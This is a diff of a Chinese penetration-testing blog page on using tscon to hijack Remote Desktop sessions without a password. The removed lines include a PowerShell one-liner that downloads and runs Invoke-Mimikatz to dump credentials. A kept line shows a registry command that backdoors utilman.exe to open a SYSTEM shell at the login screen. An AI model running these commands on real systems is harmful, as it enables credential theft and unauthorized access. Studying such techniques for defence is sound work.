@@ -15,11 +15,11 @@
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c404179db5aa630d38302fb">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c4041a050f8dd61e0410f24">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c4041b89b521a6695ab0076">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5da926b46d67ff07ef4d57c3">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c4041ce50f8dd61e04113e5">
 <meta property="og:image" content="https://mochazz.github.io/img/pentest1/p14.png">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c4041e42711cd053c709956">
-<meta property="og:updated_time" content="2019-02-04T04:48:05.000Z">
+<meta property="og:updated_time" content="2019-10-18T02:43:38.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用tscon未授权登录远程桌面">
 <meta name="twitter:description" content="​    1、 Windows系统下，tscon可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。​参考三好学生师傅的文章，故经过实际情况，发现还是有很多出路，故小结下自己的小思路。 对于开启远程桌面服务的Windows系统，当有多个用户登录该系统时，会产生多个会话，如下图：测试系统： Server 2008 R2用户A">
@@ -161,10 +161,8 @@
 <p>参考 ：</p>
 <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/" target="_blank" rel="noopener">渗透技巧——从Admin权限切换到System权限</a></p>
 <p>但在默些环境中，常常被系统策略阻断了，常常不得以实现。</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041b89b521a6695ab0076" alt=""></p>
-<p>通常一般拿到webshell后、进行mimikatz一波输出、dump出用户组的ntlm，如果exe被杀软拦截了或组策略限制了， 那依然还是可以使用Powershell进行操作</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
-<p>由于菜刀处于非交换模式，默些情况导致无法运行突破UAC的运行的下，可用辅助工具管理器后门(放大镜后门原理相同，进程为sethc.exe)配合tscon绕过系统登录界面</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5da926b46d67ff07ef4d57c3" alt=""></p>
+<p>通过设置辅助工具管理器后门(放大镜后门原理相同，进程为sethc.exe)成功解决了此问题</p>
 <p>调用辅助工具管理器的快捷键: Win+U<br>通过注册表劫持实现后门，修改注册表的命令如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
 <p>在登录界面启动辅助工具管理器，弹出cmd.exe，权限为system，如下图：</p>
